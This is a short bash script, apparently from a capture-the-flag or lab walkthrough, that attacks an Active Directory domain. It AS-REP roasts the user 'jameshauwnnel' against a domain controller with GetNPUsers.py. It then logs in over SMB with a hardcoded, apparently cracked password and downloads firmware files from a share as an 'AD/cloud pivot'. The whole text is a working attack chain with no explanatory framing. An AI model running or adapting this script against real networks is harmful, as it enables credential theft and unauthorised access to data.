#!/usr/bin/env bash
# ASREPRoast jameshauwnnel + SMB firmware download (AD/cloud pivot)
set -euo pipefail
ROOT="$(cd "$(dirname "$0")/.." && pwd)"
DC_IP="${DC_IP:-10.13.37.15}"
PASS="${JAMES_PASS:-654221p!}"
mkdir -p "$ROOT/artifacts/firmware"
echo jameshauwnnel > /tmp/aws_users.txt
GetNPUsers.py amzcorp.local/ -usersfile /tmp/aws_users.txt -no-pass -dc-ip "$DC_IP" || true
smbclient "//${DC_IP}/Product_Release" -U "amzcorp.local\\jameshauwnnel%${PASS}" \
  -c 'get AMZ-V1.0.11.128_10.2.112.chk; get AMZ-V1.0.11.128_10.2.112_Release_Notes.html' \
  -D "$ROOT/artifacts/firmware"
